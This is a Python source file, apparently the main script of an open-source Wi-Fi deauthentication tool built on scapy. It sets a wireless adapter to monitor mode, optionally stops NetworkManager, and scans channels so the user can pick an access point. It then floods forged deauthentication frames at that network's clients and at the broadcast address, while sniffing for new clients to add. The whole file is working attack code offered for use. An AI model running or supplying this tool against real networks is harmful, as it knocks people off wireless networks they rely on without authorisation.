#!/usr/bin/env python3

import sys  # leave it
import signal
import logging
import argparse
import threading  # leave it

from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
    Dot11QoS, Dot11Deauth, Dot11

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep

try:
    from .utils import *
except ImportError:
    from utils import *

conf.verb = 0


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   .....................__      __ __  _____ __         _________                          __   __ ....................
#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \.................
#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \................
#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class Interceptor:
    _ABORT = False
    _PRINT_STATS_INTV = 1
    _DEAUTH_INTV = 0.100  # 100[ms]
    _CH_SNIFF_TO = 2
    _SSID_STR_PAD = 42  # total len 80

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart, debug_mode):
        self.interface = net_iface

        self._max_consecutive_failed_send_cnt = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds

        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self.target_ssid: Union[SSID, None] = None
        self._debug_mode = debug_mode

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self.log_debug(f"Supported channels: {[c for c in self._channel_range.keys()]}")
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
        self.log_debug(f"Selected custom ssid name: {self._custom_ssid_name}")
        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
        self.log_debug(f"Selected custom bssid addr: {self._custom_ssid_name}")
        self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
        self.log_debug(f"Selected arget client mac addrs: {self._custom_target_client_mac}")
        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
        self.log_debug(f"Selected target client channels: {self._custom_target_client_mac}")

        self._custom_target_ap_last_ch = 0  # to avoid overlapping
        self._midrun_output_buffer: List[str] = list()
        self._midrun_output_lck = threading.RLock()

        self._autostart = autostart

    @staticmethod
    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
        if ssid_name is not None:
            ssid_name = str(ssid_name)
            if len(ssid_name) == 0:
                print_error(f"Custom SSID name cannot be an empty string")
                raise Exception("Invalid SSID name")
        return ssid_name

    @staticmethod
    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
        if bssid_addr is not None:
            try:
                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
            except Exception as exc:
                print_error(f"Invalid bssid address -> {bssid_addr}")
                raise Exception("Bad custom BSSID mac address")
        return bssid_addr

    @staticmethod
    def verify_mac_addr(mac_addr: str) -> str:
        RandMAC(mac_addr)
        return mac_addr

    @staticmethod
    def parse_custom_client_mac(client_mac_addrs: Union[None, str]) -> List[str]:
        custom_client_mac_list = list()
        if client_mac_addrs is not None:
            for mac in client_mac_addrs.split(','):
                try:
                    custom_client_mac_list = list()
                    custom_client_mac_list.append(Interceptor.verify_mac_addr(mac))
                except Exception as exc:
                    print_error(f"Invalid custom client mac address -> {mac}")
                    raise Exception("Bad custom client mac address")

        if custom_client_mac_list:
            print_info(f"Disabling broadcast deauth, attacking custom clients instead: {custom_client_mac_list}")
        else:
            print_info(f"No custom clients selected, enabling broadcast deauth and attacking all connected clients")

        return custom_client_mac_list

    def parse_custom_channels(self, channel_list: Union[None, str]):
        ch_list = list()
        if channel_list is not None:
            try:
                ch_list = [int(ch) for ch in channel_list.split(',')]
            except Exception as exc:
                print_error(f"Invalid custom channel input -> {channel_list}")
                raise Exception("Bad custom channel input")

            if len(ch_list):
                supported_channels = self._channel_range.keys()
                for ch in ch_list:
                    if ch not in supported_channels:
                        print_error(f"Custom channel {ch} is not supported by the network interface"
                                    f" {list(supported_channels)}")
                        raise Exception("Unsupported channel")
        return ch_list

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                os.system(f"sudo ip link set {self.interface} up")  # re-enable iface if needed
                return False
        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        return [int(channel.split('Channel')[1].split(':')[0].strip())
                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                if 'Channel' in channel and 'Current' not in channel]

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid or (self._custom_ssid_name_is_set()
                                                        and self._custom_ssid_name.lower() not in ssid.lower()):
                    return
                elif self._custom_bssid_addr_is_set() and ap_mac.lower() != self._custom_bssid_addr.lower():
                    return
                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                self._all_ssids[band_type][ssid].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
                if self._custom_ssid_name_is_set():
                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ssid].channel
            else:
                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        channels_to_scan = self._custom_target_ap_channels or self._channel_range
        print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
        if self._custom_ssid_name_is_set():
            print_info(f"Scanning for target SSID -> {self._custom_ssid_name}")
        try:
            for idx, ch_num in enumerate(channels_to_scan):
                if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
                        and self._current_channel_num - self._custom_target_ap_last_ch > 2:
                    # make sure sniffing doesn't stop on an overlapped channel for custom SSIDs
                    return
                self._set_channel(ch_num)
                print_info(f"Scanning channel {self._current_channel_num} (left -> "
                           f"{len(channels_to_scan) - (idx + 1)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO,
                      stop_filter=lambda p: Interceptor._ABORT is True)
        finally:
            printf("")

    def _found_custom_ssid_name(self):
        for all_channel_aps in self._all_ssids.values():
            for ssid_name in all_channel_aps.keys():
                if ssid_name == self._custom_ssid_name:
                    return True
        return False

    def _custom_ssid_name_is_set(self):
        return self._custom_ssid_name is not None

    def _custom_bssid_addr_is_set(self):
        return self._custom_bssid_addr is not None

    def _start_initial_ap_scan(self) -> SSID:
        self._scan_channels_for_aps()
        for band_ssids in self._all_ssids.values():
            for ssid_name, ssid_obj in band_ssids.items():
                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        pref = '[   ] '
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        ctr = 0
        target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in all_channel_aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
        if not target_map:
            Interceptor.abort_run("Not APs were found, quitting...")

        printf(DELIM)

        chosen = -1
        if self._autostart:
            if len(target_map) > 1:
                print_error(f"Cannot autostart!")
                print_error(f"Found more than 1 access points, try better filters "
                            f"(i.e 5GHz vs 2.4GHz, BSSID address...)")
            else:
                print_info("One target was found, autostart was set to True")
                chosen = 1

        # won't enter loop if autostart was set
        while chosen not in target_map.keys():
            user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:")
            try:
                chosen = int(user_input)
            except ValueError:
                print_error("Wrong input! please enter an integer")

        return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if c_mac not in [BD_MACADDR, self.target_ssid.mac_addr] and c_mac not in self.target_ssid.clients:
                        self.target_ssid.clients.append(c_mac)
                        add_to_target_list = len(self._custom_target_client_mac) == 0 or c_mac in self._custom_target_client_mac
                        with self._midrun_output_lck:
                            self._midrun_output_buffer.append(f"Found new client {BOLD}{c_mac}{RESET},"
                                                              f" adding to target list -> "
                                                              f"{GREEN if add_to_target_list else RED}{add_to_target_list}{RESET}")
        except:
            pass

    def _print_midrun_output(self):
        bf_sz = len(self._midrun_output_buffer)
        with self._midrun_output_lck:
            for output in self._midrun_output_buffer:
                print_cmd(output)
            if bf_sz > 0:
                printf(DELIM, end="\n")
                bf_sz += 1
        return bf_sz

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info(f"Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)

    def _get_target_clients(self) -> List[str]:
        return self._custom_target_client_mac or self.target_ssid.clients

    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")

            failed_attempts_ctr = 0
            ap_mac = self.target_ssid.mac_addr
            while not Interceptor._ABORT:
                try:
                    self.attack_loop_count += 1
                    for client_mac in self._get_target_clients():
                        self._send_deauth_client(ap_mac, client_mac)
                    if not self._custom_target_client_mac:
                        self._send_deauth_broadcast(ap_mac)
                    failed_attempts_ctr = 0  # reset counter
                except Exception as exc:
                    failed_attempts_ctr += 1
                    if failed_attempts_ctr >= self._max_consecutive_failed_send_cnt:
                        raise exc
                    sleep(Interceptor._DEAUTH_INTV)  # sleep to throttle down on exceptions
        except Exception as exc:
            Interceptor.abort_run(f"Exception '{exc}' in deauth-loop -> {traceback.format_exc()}")

    def _send_deauth_client(self, ap_mac: str, client_mac: str):
        sendp(RadioTap() /
              Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
              Dot11Deauth(reason=7),
              iface=self.interface)
        sendp(RadioTap() /
              Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
              Dot11Deauth(reason=7),
              iface=self.interface)

    def _send_deauth_broadcast(self, ap_mac: str):
        sendp(RadioTap() /
              Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
              Dot11Deauth(reason=7),
              iface=self.interface)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        ssid_ch = self.target_ssid.channel
        print_info(f"Attacking target {self.target_ssid.name}")
        print_info(f"Setting channel -> {ssid_ch}")
        self._set_channel(ssid_ch)

        printf(f"{DELIM}\n")

        threads = list()
        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
            t = Thread(target=action, args=tuple())
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # TODO - I remove daemon
        # TODO print info stats into thread as well
        # TODO start all 3 threads and join them
        # TODO when printing exception somewhere and setting abort as false, put a small sleep (u can wrap it) so that exception prints well
        # TODO debug prints
        # TODO test - raise exc and see output
        # TODO test - start and finish entire run
        # TODO test - debug

        # TODO update version
        # TODO docs debug mode

    def report_status(self):
        start = get_time()
        printf(f"{DELIM}\n")

        while not Interceptor._ABORT:
            buffer_sz = self._print_midrun_output()
            print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
            print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
            print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
            print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
            print_info(f"Target clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
            print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
            sleep(Interceptor._PRINT_STATS_INTV)
            if Interceptor._ABORT:  # might change while sleeping
                break
            clear_line(7 + buffer_sz)

    def log_debug(self, msg: str):
        if self._debug_mode:
            print_debug(msg)

    @staticmethod
    def user_abort(*_):
        Interceptor.abort_run(f"User asked to stop, quitting...")

    @staticmethod
    def abort_run(msg: str):
        if not Interceptor._ABORT:  # thread-safe due to GIL
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)  # let prints finish
            printf(f"{DELIM}")
            print_error(msg)
            exit(0)


def main():
    signal.signal(signal.SIGINT, Interceptor.user_abort)

    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET}")
    printf(DELIM)
    restore_print()

    if "linux" not in sys.platform:
        raise Exception(f"Unsupported operating system {sys.platform}, only linux is supported...")

    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-s', '--ssid', help='custom SSID name (case-insensitive)', metavar="ssid_name",
                        action='store', default=None, dest="custom_ssid", required=False)
    parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                        action='store', default=None, dest="custom_bssid", required=False)
    parser.add_argument('-cm', '--clients', help='MAC addresses of target clients to disconnect,'
                                                 ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
                        action='store', default=None, dest="custom_client_macs", required=False)
    parser.add_argument('-ch', '--channels', help='custom channels to scan, separated by a comma (i.e -> 1,3,4)',
                        metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
    parser.add_argument('-a', '--autostart', help='autostart the de-auth loop (if the scan result contains a single access point)',
                        action='store_true', default=False, dest="autostart", required=False)
    parser.add_argument('-d', '--debug', help='enable debug prints',
                        action='store_true', default=False, dest="debug_mode", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           ssid_name=pargs.custom_ssid,
                           bssid_addr=pargs.custom_bssid,
                           custom_client_macs=pargs.custom_client_macs,
                           custom_channels=pargs.custom_channels,
                           autostart=pargs.autostart,
                           debug_mode=pargs.debug_mode)
    attacker.run()


if __name__ == "__main__":
    main()
